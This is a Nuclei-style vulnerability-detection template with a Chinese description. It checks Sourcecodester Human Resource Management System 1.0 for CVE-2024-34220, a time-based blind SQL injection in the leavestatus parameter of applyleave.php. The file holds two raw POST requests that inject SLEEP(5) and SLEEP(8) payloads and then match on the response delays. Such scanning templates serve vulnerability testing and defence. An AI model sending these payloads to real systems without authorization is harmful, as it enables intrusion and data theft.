id: hr-management-system-10-sqli
info:
  name: "Sourcecodester Human Resource Management System 1.0 leave 参数 SQL 注入"
  author: 0dayPoc
  severity: high
  description: |-
    Sourcecodester Human Resource Management System 1.0 在leave参数处理逻辑中存在SQL注入缺陷，攻击者可通过构造恶意SQL负载实现数据库查询操控。该漏洞允许未经授权的数据库枚举、数据泄露及持久化攻击。
      受影响组件：leave参数交互接口
      漏洞验证方式：SQL注入特征响应识别
  reference:
  - CVE-2024-34220
  tags: Sourcecodester-Human-Resource-Management-System
http:
- raw:
  - |
    POST /hrm/user/applyleave.php HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Connection: close
    Cookie: PHPSESSID=2v2v2al4dkd4iir9cl5j7oikvr
    Upgrade-Insecure-Requests: 1
    X-PwnFox-Color: cyan

    leavestatus=5'+AND+(SELECT+1337+FROM+(SELECT(SLEEP(5)))VSgR)+AND+'Kha'%3d'123&reason=+++&startdate=03%2F04%2F2024&enddate=29%2F04%2F2024&Apply=Submit
  - |
    POST /hrm/user/applyleave.php HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Connection: close
    Cookie: PHPSESSID=2v2v2al4dkd4iir9cl5j7oikvr
    Upgrade-Insecure-Requests: 1
    X-PwnFox-Color: cyan

    leavestatus=5'+AND+(SELECT+1337+FROM+(SELECT(SLEEP(8)))VSgR)+AND+'Kha'%3d'123&reason=+++&startdate=03%2F04%2F2024&enddate=29%2F04%2F2024&Apply=Submit
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
